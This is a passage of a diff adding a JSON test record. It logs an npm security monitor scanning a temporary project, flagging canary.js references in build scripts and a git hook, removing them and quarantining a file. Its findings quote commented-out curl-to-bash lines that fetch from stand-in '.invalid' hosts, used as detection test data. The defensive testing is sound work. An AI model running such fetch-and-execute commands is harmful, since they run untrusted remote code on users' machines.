@@ -1,0 +1,4151 @@
+{
+  "date": "2026-10-12",
+  "implementationRevision": "3cf1f10a0403f259686ed443075d254b87f5784d",
+  "node": "v24.16.0",
+  "platform": "win32",
+  "method": "Real foreground CLI monitor in an isolated temporary project. Introduced comments-only canary text and direct manifest/hook references after initial watcher registration. No scanned script, hook, canary or downloaded content executed; no npm launched. Temporary test directory removed after assertions.",
+  "command": [
+    "C:\\Program Files\\nodejs\\node.exe",
+    "E:\\np-audit\\bin\\npa.js",
+    "canary-monitor",
+    "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project",
+    "--json",
+    "--interval",
+    "5000"
+  ],
+  "pid": 53216,
+  "initial": {
+    "event": "scan",
+    "report": {
+      "scan": "canary-killer",
+      "roots": [
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project"
+      ],
+      "complete": false,
+      "findings": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks\\pre-commit",
+          "line": 2,
+          "evidence": "node test/fixtures/incident-derived-reconstruction/present/canary.js",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+          "line": 1,
+          "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "line": 1,
+          "evidence": "// Incident-derived reconstruction: inert representative source text only.",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "File is named canary.js; inspect behavior independently of its name."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "line": 4,
+          "evidence": "// exec('(curl -fsSL \"http://incident-reconstruction.invalid/engagement/stage\" | bash) || true');",
+          "evidenceTruncated": false,
+          "name": "remote-to-shell",
+          "severity": "review",
+          "detail": "Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+          "line": 1,
+          "evidence": "// Incident-derived reconstruction: inert temporary-directory residue.",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "File is named canary.js; inspect behavior independently of its name."
+        }
+      ],
+      "references": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks\\pre-commit",
+          "line": 2,
+          "evidence": "node test/fixtures/incident-derived-reconstruction/present/canary.js",
+          "evidenceTruncated": false,
+          "reference": "test/fixtures/incident-derived-reconstruction/present/canary.js",
+          "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "status": "exists"
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+          "line": 1,
+          "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+          "evidenceTruncated": false,
+          "reference": "test/fixtures/incident-derived-reconstruction/present/canary.js",
+          "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "status": "exists"
+        }
+      ],
+      "unreadable": [],
+      "exclusions": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git",
+          "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+        }
+      ],
+      "unresolved": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+          "reason": "Command entry point is not statically resolved",
+          "line": 1,
+          "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+          "evidenceTruncated": false,
+          "command": "tsc"
+        }
+      ],
+      "coverage": {
+        "files": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\config",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks\\pre-commit",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js"
+        ],
+        "canaryFiles": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js"
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js"
+          }
+        ],
+        "repositories": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project"
+          }
+        ],
+        "entries": 16,
+        "bytes": 699,
+        "gitConfigs": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\config"
+          }
+        ],
+        "hookDirectories": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks",
+            "configuredBy": "default"
+          }
+        ],
+        "filenameOnlyFiles": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json"
+        ]
+      },
+      "limits": {
+        "files": 10000,
+        "entries": 20000,
+        "fileBytes": 1048576,
+        "totalBytes": 33554432,
+        "records": 2000,
+        "depth": 100
+      },
+      "limitations": [
+        "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+        "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+        "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+        "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+        "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.",
+        "Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately."
+      ],
+      "summary": {
+        "status": "incomplete",
+        "files": 5,
+        "findings": 5,
+        "unresolved": 1,
+        "unreadable": 0,
+        "exclusions": 1
+      },
+      "trust": {
+        "files": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+            "expectedSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json",
+            "actualSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "status": "trusted"
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+            "expectedSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json",
+            "actualSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "status": "trusted"
+          }
+        ],
+        "before": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+            "expectedSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json",
+            "actualSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "status": "trusted"
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+            "expectedSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json",
+            "actualSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "status": "trusted"
+          }
+        ],
+        "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+      },
+      "repairs": {
+        "actionsComplete": true,
+        "actions": [],
+        "failures": [],
+        "ignoreRoots": []
+      },
+      "quarantine": {
+        "actionsComplete": true,
+        "actions": [],
+        "excludedStorage": [],
+        "ignoreUpdates": [],
+        "ignoreFailures": [],
+        "before": {
+          "summary": {
+            "status": "incomplete",
+            "files": 5,
+            "findings": 5,
+            "unresolved": 1,
+            "unreadable": 0,
+            "exclusions": 1
+          },
+          "unreadable": [],
+          "exclusions": [
+            {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git",
+              "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+            }
+          ],
+          "unresolved": [
+            {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+              "reason": "Command entry point is not statically resolved",
+              "line": 1,
+              "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+              "evidenceTruncated": false,
+              "command": "tsc"
+            }
+          ]
+        },
+        "evidence": []
+      },
+      "protection": {
+        "allowed": true,
+        "failures": []
+      },
+      "monitor": {
+        "mode": "protect",
+        "intervalMs": 5000,
+        "watchedRoots": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project"
+        ],
+        "watchErrors": [],
+        "limitation": "Arrival monitoring does not intercept execution; a file may run before a notification or periodic check is handled."
+      }
+    }
+  },
+  "arrival": {
+    "event": "scan",
+    "report": {
+      "scan": "canary-killer",
+      "roots": [
+        "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project"
+      ],
+      "complete": false,
+      "findings": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks\\pre-commit",
+          "line": 2,
+          "evidence": "node test/fixtures/incident-derived-reconstruction/present/canary.js",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+          "line": 1,
+          "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "Text references canary.js; the name alone does not establish malicious behavior."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "line": 1,
+          "evidence": "// Incident-derived reconstruction: inert representative source text only.",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "File is named canary.js; inspect behavior independently of its name."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "line": 4,
+          "evidence": "// exec('(curl -fsSL \"http://incident-reconstruction.invalid/engagement/stage\" | bash) || true');",
+          "evidenceTruncated": false,
+          "name": "remote-to-shell",
+          "severity": "review",
+          "detail": "Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified."
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+          "line": 1,
+          "evidence": "// Incident-derived reconstruction: inert temporary-directory residue.",
+          "evidenceTruncated": false,
+          "name": "canary-indicator",
+          "severity": "indicator",
+          "detail": "File is named canary.js; inspect behavior independently of its name."
+        }
+      ],
+      "references": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks\\pre-commit",
+          "line": 2,
+          "evidence": "node test/fixtures/incident-derived-reconstruction/present/canary.js",
+          "evidenceTruncated": false,
+          "reference": "test/fixtures/incident-derived-reconstruction/present/canary.js",
+          "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "status": "exists"
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+          "line": 1,
+          "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+          "evidenceTruncated": false,
+          "reference": "test/fixtures/incident-derived-reconstruction/present/canary.js",
+          "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "status": "exists"
+        }
+      ],
+      "unreadable": [],
+      "exclusions": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git",
+          "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+        },
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.np-audit-quarantine",
+          "reason": "Quarantine storage is not analyzed"
+        }
+      ],
+      "unresolved": [
+        {
+          "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+          "reason": "Command entry point is not statically resolved",
+          "line": 1,
+          "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+          "evidenceTruncated": false,
+          "command": "tsc"
+        }
+      ],
+      "coverage": {
+        "files": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\config",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks\\pre-commit",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js"
+        ],
+        "canaryFiles": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js"
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js"
+          }
+        ],
+        "repositories": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project"
+          }
+        ],
+        "entries": 18,
+        "bytes": 699,
+        "gitConfigs": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\config"
+          }
+        ],
+        "hookDirectories": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks",
+            "configuredBy": "default"
+          }
+        ],
+        "filenameOnlyFiles": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.gitignore",
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json"
+        ]
+      },
+      "limits": {
+        "files": 10000,
+        "entries": 20000,
+        "fileBytes": 1048576,
+        "totalBytes": 33554432,
+        "records": 2000,
+        "depth": 100
+      },
+      "limitations": [
+        "Static text heuristics can match comments, strings and legitimate tools; matches are not malware verdicts.",
+        "No scripts, hooks, Git commands, downloads or repository-configured external commands are executed.",
+        "Only supplied local roots are inspected, including untracked files present there. A GitHub checkout cannot inspect other machines or their local .git/hooks.",
+        "System/global Git configuration and environment overrides are not inferred. Conditional includes and dynamic commands remain unresolved.",
+        "This scan cannot establish host integrity, recover deleted contents, attribute an incident or reconstruct a previously executed payload.",
+        "Protection checks all discovered filenames; content inspection is limited to manifests, Git config/hooks and canary.js. Filename-only paths are listed separately."
+      ],
+      "summary": {
+        "status": "incomplete",
+        "files": 5,
+        "findings": 5,
+        "unresolved": 1,
+        "unreadable": 0,
+        "exclusions": 2
+      },
+      "trust": {
+        "files": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+            "expectedSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json",
+            "actualSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "status": "trusted"
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+            "expectedSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json",
+            "actualSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "status": "trusted"
+          }
+        ],
+        "before": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+            "expectedSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json",
+            "actualSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "status": "trusted"
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+            "expectedSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "configuredBy": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.npmauditor.json",
+            "actualSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "status": "trusted"
+          }
+        ],
+        "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+      },
+      "repairs": {
+        "actionsComplete": true,
+        "actions": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git\\hooks\\pre-commit",
+            "line": 3,
+            "evidence": "node incoming/canary.js",
+            "evidenceTruncated": false,
+            "before": "node incoming/canary.js",
+            "after": null,
+            "targets": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\incoming\\canary.js"
+            ]
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+            "line": 1,
+            "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"node incoming/canary.js && tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+            "evidenceTruncated": false,
+            "script": "build",
+            "before": "node incoming/canary.js && tsc",
+            "after": "tsc",
+            "targets": [
+              "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\incoming\\canary.js"
+            ]
+          }
+        ],
+        "failures": [],
+        "ignoreRoots": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project"
+        ]
+      },
+      "quarantine": {
+        "actionsComplete": true,
+        "actions": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\incoming\\canary.js",
+            "status": "quarantined",
+            "ignore": {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.gitignore",
+              "status": "updated"
+            },
+            "target": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.np-audit-quarantine\\entry-y5lkFi\\payload.quarantined",
+            "metadata": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.np-audit-quarantine\\entry-y5lkFi\\metadata.json"
+          }
+        ],
+        "excludedStorage": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.np-audit-quarantine"
+        ],
+        "ignoreUpdates": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.gitignore",
+            "status": "updated"
+          }
+        ],
+        "ignoreFailures": [],
+        "before": {
+          "summary": {
+            "status": "incomplete",
+            "files": 6,
+            "findings": 9,
+            "unresolved": 1,
+            "unreadable": 0,
+            "exclusions": 1
+          },
+          "unreadable": [],
+          "exclusions": [
+            {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\.git",
+              "reason": "Git metadata other than config, config.worktree, commondir and hooks is not analyzed"
+            }
+          ],
+          "unresolved": [
+            {
+              "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\package.json",
+              "reason": "Command entry point is not statically resolved",
+              "line": 1,
+              "evidence": "{\"name\":\"monitor-proof\",\"private\":true,\"scripts\":{\"build\":\"node incoming/canary.js && tsc\",\"prepare\":\"node test/fixtures/incident-derived-reconstruction/present/canary.js\"}}",
+              "evidenceTruncated": false,
+              "command": "tsc"
+            }
+          ]
+        },
+        "evidence": [
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\incoming\\canary.js",
+            "line": 1,
+            "evidence": "// Harmless arrival test; never execute",
+            "evidenceTruncated": false,
+            "name": "canary-indicator",
+            "severity": "indicator",
+            "detail": "File is named canary.js; inspect behavior independently of its name."
+          },
+          {
+            "path": "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project\\incoming\\canary.js",
+            "line": 2,
+            "evidence": "// curl http://monitor-proof.invalid/payload | bash",
+            "evidenceTruncated": false,
+            "name": "remote-to-shell",
+            "severity": "review",
+            "detail": "Download command, possibly continued across lines, is piped to a shell; fetched content is not retrieved or verified."
+          }
+        ]
+      },
+      "protection": {
+        "allowed": true,
+        "failures": []
+      },
+      "monitor": {
+        "mode": "protect",
+        "intervalMs": 5000,
+        "watchedRoots": [
+          "C:\\Users\\tionn\\AppData\\Local\\Temp\\npa-step3-live-phIW6R\\project"
+        ],
+        "watchErrors": [],
+        "limitation": "Arrival monitoring does not intercept execution; a file may run before a notification or periodic check is handled."
+      }
+    }
+  },
+  "elapsedMs": 245,
+  "after": {
+    "canaryPresent": false,
+    "payloadSha256": "8d42d90f8981ef04c17278ce1dfee8c2b3d62b0893600eaf5852632c92c99bf2",
+    "quarantineSha256": "8d42d90f8981ef04c17278ce1dfee8c2b3d62b0893600eaf5852632c92c99bf2",
+    "trustedFilesUnchanged": true,
+    "scripts": {
+      "build": "tsc",
+      "prepare": "node test/fixtures/incident-derived-reconstruction/present/canary.js"
+    },
+    "hook": "# representative hook; never execute\nnode test/fixtures/incident-derived-reconstruction/present/canary.js\n",
+    "ignore": "# np-audit Canary Killer quarantine\ncanary.js\n.np-audit-quarantine/\n!/test/fixtures/incident-derived-reconstruction/present/canary.js\n!/test/fixtures/incident-derived-reconstruction/temporary/dev/shm/canary.js\n"
+  },
+  "stderr": "",
+  "stopped": {
+    "code": null,
+    "signal": "SIGTERM"
+  },
+  "checkoutSession": {
+    "observedAt": "2026-10-12T18:54:21.101Z",
+    "pid": 58532,
+    "toolSessionId": 59386,
+    "runningAtObservation": true,
+    "command": [
+      "node",
+      "bin/npa.js",
+      "canary-monitor",
+      "E:/np-audit",
+      "--exclude",
+      "E:/np-audit/node_modules",
+      "--exclude",
+      "E:/np-audit/test/fixtures/incident-derived-reconstruction/removed",
+      "--exclude",
+      "E:/np-audit/test/fixtures/incident-derived-reconstruction/present/.githooks",
+      "--json"
+    ],
+    "method": "Foreground monitor in this task; a temporary observer forwards its real output as bounded summaries and retains its initial report. No service, profile or automatic startup was installed.",
+    "initial": {
+      "event": "scan",
+      "roots": [
+        "E:\\np-audit"
+      ],
+      "complete": false,
+      "summary": {
+        "status": "incomplete",
+        "files": 21,
+        "findings": 5,
+        "unresolved": 425,
+        "unreadable": 0,
+        "exclusions": 4
+      },
+      "monitor": {
+        "mode": "protect",
+        "intervalMs": 5000,
+        "watchedRoots": [
+          "E:\\np-audit"
+        ],
+        "watchErrors": [],
+        "limitation": "Arrival monitoring does not intercept execution; a file may run before a notification or periodic check is handled."
+      },
+      "trust": {
+        "files": [
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+            "expectedSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "configuredBy": "E:\\np-audit\\.npmauditor.json",
+            "actualSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "status": "trusted"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+            "expectedSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "configuredBy": "E:\\np-audit\\.npmauditor.json",
+            "actualSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "status": "trusted"
+          }
+        ],
+        "before": [
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\present\\canary.js",
+            "expectedSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "configuredBy": "E:\\np-audit\\.npmauditor.json",
+            "actualSha256": "c26f91af317e0559b3a387b584a58e8ad2c95b06fb972471addcbd97900be7e5",
+            "status": "trusted"
+          },
+          {
+            "path": "E:\\np-audit\\test\\fixtures\\incident-derived-reconstruction\\temporary\\dev\\shm\\canary.js",
+            "expectedSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "configuredBy": "E:\\np-audit\\.npmauditor.json",
+            "actualSha256": "2c2c77aec4da9e3d5484e12c98c1dc80c1d781d3f1f2e7dbe41cea235d785eda",
+            "status": "trusted"
+          }
+        ],
+        "basis": "Explicit path and SHA-256 exceptions; neither filenames nor trust entries establish a malware or safety verdict."
+      },
+      "repairs": {
+        "actionsComplete": true,
+        "actions": [],
+        "failures": [],
+        "ignoreRoots": []
+      },
+      "quarantine": {
+        "actionsComplete": true,
+        "actions": [],
+        "excludedStorage": [],
+        "ignoreUpdates": [],
+        "ignoreFailures": [],
